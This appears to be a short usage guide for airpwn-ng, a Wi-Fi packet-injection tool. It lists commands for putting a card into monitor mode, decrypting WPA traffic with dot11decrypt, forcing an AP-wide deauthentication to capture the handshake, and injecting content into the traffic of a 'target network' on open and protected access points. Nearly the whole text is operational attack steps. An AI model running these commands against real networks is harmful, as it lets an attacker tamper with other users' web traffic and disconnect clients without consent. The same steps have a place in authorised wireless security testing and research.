Example Steps to get airpwn-ng running for an Open Access Point:

1. Drop desired NIC to monitor mode
	- airmon-ng start wlan0
	-OR
	- airmon-zc start wlan0

## It should be noted here that -zc will create wlan0mon and -ng will create mon0.  Depending on the svn of your aircrack-ng, -zc might have already replaced -ng.  Either or will work fine, but some people will experience -1 problems when dealing with channels using -ng.

## For purposes of clarity, mon0 will reference the Monitor Mode NIC from here on out.

2. Connect your injection NIC to the target network. We'll assume wlan1 is doing this for the next command.

3. Now it's time to inject our content.
	- ./airpwn-ng -m mon0 -i wlan1 --inject example-injects/wargames

## If you're injecting on WEP/WPA protected network:

0. This guide assumes you have already installed dot11decrypt. It has been tested on just one NIC but you can use two for efficiency

1. Drop desired NIC to monitor mode
	- airmon-ng start wlan0
	-OR
	- airmon-zc start wlan0

2. Change monitor mode NIC to the desired channel
	- iwconfig mon0 <channel>
	- if this doesn't work, set the monitor NIC's channel with airmon-ng start wlan0 <channel>

3. Create a TAP interface that live-decrypts traffic using dot11decrypt
	- dot11decrypt mon0 wpa:<essid>:<key>
	- e.g. dot11decrypt mon0 wpa:MyNetwork:MyHardToCrackPassword
	- IMPORTANT NOTE: dot11decrypt (and any other decryption software) needs to capture the 4-way handshake between the AP and the client before being able to decrypt traffic, so an AP-wide deauth should be performed right after enabling the TAP interface
	- ALSO: dot11decrypt can handle more than one protected network by providing an arbitrary number of wpa:<essid>:<key> tuples, but airpwn-ng can only handle one AP in Encrypted Wireless mode for now

4. Connect and authenticate to the target network with your injection NIC
	- We're assuming wlan0 for this, in a one NIC scenario

5. Now it's time to inject our content.
	- ./airpwn-ng -m tap0 -i wlan0 --inject example-injects/wargames

Okay, that's all.  How about a nice game of chess?
